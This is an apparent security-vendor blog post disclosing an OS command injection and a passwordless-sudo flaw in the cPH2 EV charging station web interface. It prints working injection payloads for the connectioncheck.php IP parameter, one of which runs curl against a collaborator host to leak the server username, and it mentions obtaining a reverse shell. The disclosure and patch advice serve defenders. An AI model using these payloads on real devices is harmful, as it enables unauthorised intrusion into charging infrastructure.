




<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
  <title>
    
      
        OS Command Injection in cPH2 Charging Station &lt;2.0.0 (CVE-2023-46359 and CVE-2023-46360) | Offensity
      
    
  </title>
  <meta name="description" content="
    Security reports: efficient and straightforward. The simplest way to detect and fix vulnerabilities
    ">

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  

<link rel="icon"                             href="/static/img/favicons/favicon.b40bcf662e92.ico"       type="image/png" >
<link rel="icon"             sizes="32x32"   href="/static/img/favicons/favicon-32x32.c04ea7432641.png" type="image/png">
<link rel="icon"             sizes="16x16"   href="/static/img/favicons/favicon-16x16.1b9f9ac10ab2.png" type="image/png">
<link rel="apple-touch-icon" sizes="180x180" href="/static/img/favicons/apple-touch-icon.d4292be8229c.png">

<link rel="mask-icon" href="/static/img/favicons/safari-pinned-tab.a6b1f8bf6958.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#2b5797">
<meta name="theme-color" content="#ffffff">


  
    

<meta property="og:image" content="https://www.offensity.com/static/img/2022/main-hero-image.b0185c5d2276.png" />
<meta property="og:title" name="title" content="
  
    
      OS Command Injection in cPH2 Charging Station &lt;2.0.0 (CVE-2023-46359 and CVE-2023-46360) | Offensity
    
  
">


  

  <link href="/static/css/helper-webflow.1c0c27591bcf.css" rel="stylesheet">
  <link href="/static/css/normalize.25b2e0265584.css" rel="stylesheet">
  <link href="/static/css/webflow.f4371e634c74.css" rel="stylesheet">
  <link href="/static/css/offensity.webflow.11401112c5de.css" rel="stylesheet">

  
  <link href="/static/css/pages.77be530408bb.css" rel="stylesheet">


  <link rel="canonical" href="https://www.offensity.com/en/blog/os-command-injection-in-cph2-charging-station-200-cve-2023-46359-and-cve-2023-46360/">

  
  
</head>
<body class="blog-page body">

  <!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-ND88VML"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

  

  
    
  

  
    





<div data-animation="over-right" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease"
     role="banner" class="navbar w-nav">
  <div class="navbar-container w-container">
    <div class="navbar-wrapper">
      <a href="/en/" title="offensity.com/en/" aria-current="page"
         class="brand w-nav-brand w--current"><img
        src="/static/img/2022/offensity-logo.a280f1ac3bd0.svg" loading="lazy" alt="logo" class="logo-image"></a>
      <nav role="navigation" class="nav-menu w-nav-menu">
        <div class="close-menu w-nav-button"><img src="/static/img/2022/mobile-close-icon.4e1cdcd5d2cd.svg" loading="lazy"
                                                  alt="close"></div>
        <div class="links-wrapper">
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          



  
    
      <a href="/en/solution/"
         class="nav-link w-nav-link">
        Solution
      </a>
    
  

  
    
      <a href="/en/pricing/"
         class="nav-link w-nav-link">
        Pricing
      </a>
    
  

  
    
      <a href="/en/demo/" target="_blank"
         class="nav-link w-nav-link">
        Demo
      </a>
    
  

  


        </div>
        <div class="nav-buttons mobile">
          <div class="lang-wrapper">
            <a href="/de/"
               class=" lang-switcher ">DE</a>
            <a href="/en/"
               class=" lang-switcher w--current ">EN</a>
          </div>
          
            <a href="https://reporting.offensity.com" class="default-button margin-right w-button">
              Offensity Login ↗
            </a>
          
          <a href="/en/signup/" class="default-button style-2 w-button">Get it free</a>
        </div>
      </nav>
      <div class="nav-buttons">
        <a href="/de/"
           class=" lang-switcher ">DE</a>
        <a href="/en/"
           class=" lang-switcher w--current ">EN</a>
        
          <a href="https://reporting.offensity.com" class="default-button margin-right w-button">
            Offensity Login ↗
          </a>
        
        



      <a href="/en/try-offensity-for-free/"
         class="default-button style-2 w-button">
        Try for free
      </a>



      </div>
      <div class="menu-button-2 w-nav-button"><img src="/static/img/2022/mobile-burger-menu.0fe3faa0a176.svg" loading="lazy"
                                                   width="30" alt="burger-menu"></div>
    </div>
  </div>
</div>

  

  

  <div class="hero-section-champaign wf-section">
    <div class="container-default w-container">
      <h1 class="heading">OS Command Injection in cPH2 Charging Station &lt;2.0.0 (CVE-2023-46359 and CVE-2023-46360)</h1>
      <p class="hero-text mt-15">
        
          <strong>Ewen Coppens, Dec. 14, 2023</strong>
          </p>
    </div>

  </div>



  <main role="main" class="body">
    
  
    <div class="container-default w-container">
      <div class="block-paragraph_block"><p data-block-key="yv33q">During a web application penetration test for one of our clients we identified an OS Command Injection in the <b>cPH2</b> charging station produced by eCharge Hardy Barth GmbH.</p>
</div>
<div class="block-paragraph_block"><p data-block-key="jl42d">The cPH2 charging station comes with a web interface where an administrator can monitor and manage real time usage, charge logs, firmware update as well as configuration settings.</p>
</div>
<div class="block-image_block">
  <figure>
    






<img alt=""
     src="https://sos-at-vie-1.exo.io/offensity-www-media/images/config_interface.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=6f1ab855e04a64ae8648beee02f9eed90ad830d8ed6528936531265da36e5e12"
     sizes="100vw" class="full-width"

   srcset="https://sos-at-vie-1.exo.io/offensity-www-media/images/config_interface.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=6f1ab855e04a64ae8648beee02f9eed90ad830d8ed6528936531265da36e5e12 320w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/config_interface.width-640.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=aca8cee4cfd613201176c9b5a3d66a99d9abfe6f036411e17afa06f83f019f2b 640w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/config_interface.width-930.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=cfac455566ffea98c7937abc47e17317954c8933c72da99315f3a7cbfb871948 930w">

    <figcaption>Configuration Page</figcaption>
  </figure>
</div>
<div class="block-paragraph_block"><p data-block-key="joeq4">The vulnerable PHP page is not visible in the user interface, but an inspection of the page source unveiled the existence of the &quot;<b>/connectioncheck.php</b>&quot; endpoint, which takes an <b>IP</b> address as a parameter. Initially designed to assess connectivity to the provided IP, likely through a ping command, this endpoint may be susceptible to <b>OS Command Injection</b>.</p>
</div>
<div class="block-image_block">
  <figure>
    






<img alt=""
     src="https://sos-at-vie-1.exo.io/offensity-www-media/images/vulnerable_endpoint_in_source_code.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=c91ada7b2afb4dd7b04827d51531e80cf6825f0127ea5bea7e9e7cdda50d0e4a"
     sizes="100vw" class="full-width"

   srcset="https://sos-at-vie-1.exo.io/offensity-www-media/images/vulnerable_endpoint_in_source_code.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=c91ada7b2afb4dd7b04827d51531e80cf6825f0127ea5bea7e9e7cdda50d0e4a 320w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/vulnerable_endpoint_in_source_code.width-640.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=574e2e35f1363b672fe36feaeecc39e645052da5a606d895d4a69a92d5cdf03a 640w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/vulnerable_endpoint_in_source_code.width-930.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=1297d20f6e957390e99bc3dfde153e460f5be60a52e82fc758add1b1035c0180 930w">

    <figcaption>Vulnerable endpoint discovered in the page source of /config.php</figcaption>
  </figure>
</div>
<div class="block-paragraph_block"><p data-block-key="joeq4">Using a straightforward payload such as <i>ip=127.0.0.1 &amp;&amp; ${whoami}</i>, the server responds with <i>127.0.0.1 &amp;&amp; ${whoami} =&gt; &lt;b&gt;SUCCESS&lt;/b&gt;</i>. This indicates that the command injection has been successfully executed. However, it is evident that the server is not displaying the output or result of the executed command.</p><p data-block-key="bdgmk"></p><p data-block-key="cap1r">In order to verify that the paylaod is executed and to extract data, we tried an out-of-band payload <i>127.0.0.1 &amp;&amp; curl $(whoami).puna2r96oxpuhbuhki9vvrinkeq5ex2m.examplecollab.com</i> and we received DNS and HTTP request to our burp collaborator for the domain <i>www-data.puna2r96oxpuhbuhki9vvrinkeq5ex2m.examplecollab.com.</i></p>
</div>
<div class="block-image_block">
  <figure>
    






<img alt=""
     src="https://sos-at-vie-1.exo.io/offensity-www-media/images/dns_request_out_of_band.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=5aa198b8490b36e7ae35c21eaef37d33eadc3f4f23cea0913ba5ca238fc47b8b"
     sizes="100vw" class="full-width"

   srcset="https://sos-at-vie-1.exo.io/offensity-www-media/images/dns_request_out_of_band.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=5aa198b8490b36e7ae35c21eaef37d33eadc3f4f23cea0913ba5ca238fc47b8b 320w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/dns_request_out_of_band.width-640.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=8065aaba127b4eec78824c4f7944a2e5463be9ac799092d87d5852d2b8720de9 640w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/dns_request_out_of_band.width-930.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=48f487f8e73e745bd93fe2afc7dd24f298dd4daca0b2a64fffbcdc28350bd618 930w">

    <figcaption>DNS request received for the domain www-data.puna2r96oxpuhbuhki9vvrinkeq5ex2m.examplecollab.com.</figcaption>
  </figure>
</div>
<div class="block-paragraph_block"><p data-block-key="s8d2h">Having confirmed the successful execution of the payload on the target device, we can now deploy a payload to initiate a reverse shell. This specific OS Command Injection vulnerability is formally identified as <b>CVE-2023-46359</b>.</p>
</div>
<div class="block-image_block">
  <figure>
    






<img alt=""
     src="https://sos-at-vie-1.exo.io/offensity-www-media/images/reverse-shell.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=2ec449721fe992ac047b1881abb5a2491368d93a3507909d6f51ad310815b0a9"
     sizes="100vw" class="full-width"

   srcset="https://sos-at-vie-1.exo.io/offensity-www-media/images/reverse-shell.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=2ec449721fe992ac047b1881abb5a2491368d93a3507909d6f51ad310815b0a9 320w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/reverse-shell.width-640.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=c6e05ccb6cabd8f34cae7cde471b3cdaefd84ad51015aaf9a8f23c03810fe561 640w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/reverse-shell.width-930.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T172855Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=c2b1cf21b745464d5b096c72d05dea18a84d07ebacbfcd25bf046d8d0619715b 930w">

    <figcaption>Reverse shell obtained as www-data</figcaption>
  </figure>
</div>
<div class="block-paragraph_block"><p data-block-key="gosal">As we can see on the screenshot above, the service is currently running under the user context of <i>www-data</i>, and it has been discovered that this user possesses unnecessary privileges, specifically the ability to execute sudo commands without requiring a password. This configuration could pose a security risk, as an attacker with access to the <i>www-data</i> context may exploit these elevated privileges for unauthorized actions on the system. This vulnerability is referenced by as <b>CVE-2023-46360.</b></p>
</div>
<div class="block-paragraph_block"><p data-block-key="732vh">A nuclei template for the <b>CVE-2023-46359</b> can be found on the <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-46359.yaml">nuclei-templates repository</a>.</p>
</div>
<div class="block-paragraph_block"><p data-block-key="gosal">Both vulnerabilities affect any cPH2 Charging Station version &lt; 2.0.0.<br/> The affected customers are advised to update their system to <a href="http://salia.echarge.de/firmware/">the version 2.0.0 or later</a></p>
</div>

      
      

      
    </div>
  

  </main>

  
    

<div class="section wf-section">
  <div class="container-extra-small w-container">
    <div class="banner tracking-banner">
      <div class="container center-container">
        <div class="row">
          <div class="col-sm-10">
            <p>
              
                This website uses cookies and other technology to customize advertising
                and provide you a more personalized experience. To find out more,
                see our <a href="/en/privacy/">Privacy Policy</a>.
              
            </p>
            <p>
              
                Unless you explicitly allow tracking, your data will not be collected using Google Analytics.
              
            </p>

          </div>
          <div class="col-sm-2">
            <button class="js-tracking-accept default-button style-2 w-button btn-center" >
              Allow tracking</button>
            <button class="js-tracking-deny default-button">
              Do not track</button>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>


  

  
    



<div class="footer-wrapper wf-section">
    <div class="wrap">
      <div class="w-layout-grid footer">
        <a id="w-node-ac901f39-8c9e-5153-0f09-5850d60c738e-d2795924" href="/" class="w-inline-block"><img src="/static/img/2022/offensity-logo-white.2ee1a7096670.svg" loading="lazy" id="w-node-_61e74489-159b-d7fd-84ba-75aed2795927-d2795924" alt="" class="footer-image"></a>
        <div id="w-node-_61e74489-159b-d7fd-84ba-75aed2795928-d2795924" class="footer-grid-column">
          <div id="w-node-_61e74489-159b-d7fd-84ba-75aed2795929-d2795924" class="label w-inline-block">Product</div>
          <a href="/login" class="footer-link">Offensity</a>
        </div>
        




        <div id="w-node-_61e74489-159b-d7fd-84ba-75aed2795931-d2795924" class="footer-grid-column">
          <div id="w-node-_61e74489-159b-d7fd-84ba-75aed279593b-d2795924" class="label w-inline-block">Resources</div>
          <a href="/en/blog/" class="footer-link">Blog</a>
          <a href="/en/faq/" class="footer-link">FAQ</a>
        </div>
        <div id="w-node-_61e74489-159b-d7fd-84ba-75aed2795943-d2795924" class="footer-grid-column">
          <div id="w-node-_61e74489-159b-d7fd-84ba-75aed2795944-d2795924" class="label w-inline-block">About</div>
          <a href="https://a1.digital/" target="_blank" class="footer-link">A1 Digital</a>
          <a href="/en/team" class="footer-link">About Us</a>
        </div>
        <div id="w-node-_61e74489-159b-d7fd-84ba-75aed279594c-d2795924" class="footer-grid-column">
          <div id="w-node-_61e74489-159b-d7fd-84ba-75aed279594d-d2795924" class="label w-inline-block">Germany</div>
          <div class="footer-text">St. Martin Straße 59<br>81669 Munich<br>Germany</div>
        </div>
        <div id="w-node-_61e74489-159b-d7fd-84ba-75aed2795955-d2795924" class="footer-grid-column">
          <div class="label w-inline-block">Austria</div>
          <div class="footer-text">Lassallestraße 9<br>1020 Vienna<br>Austria</div>
        </div>
        <div id="w-node-_61e74489-159b-d7fd-84ba-75aed279595e-d2795924" class="footer-grid-column">
          <div class="label w-inline-block"></div>
          <a href="/en/contact/" class="footer-link">Contact</a>
          <a href="/en/privacy/" class="footer-link">Privacy Policy</a>
          <a href="/en/imprint/" class="footer-link">Imprint</a>
        </div>
      </div>
    </div>
  </div>



  



  <script src="/static/js/vendor/jquery-3.5.1.min.12b69d0ae6c6.js"></script>
  <script src="/static/js/vendor/lottie-player.cfc909dd4bec.js"></script>
  <script src="/static/js/2022/webflow.a821adce20fc.js" async defer></script>
  <script src="/static/js/components/004_signup-combo.0091e42240a0.js"></script>
  <script src="/static/js/components/011_cookie-consent.673a7024175b.js"></script>


</body>


</html>
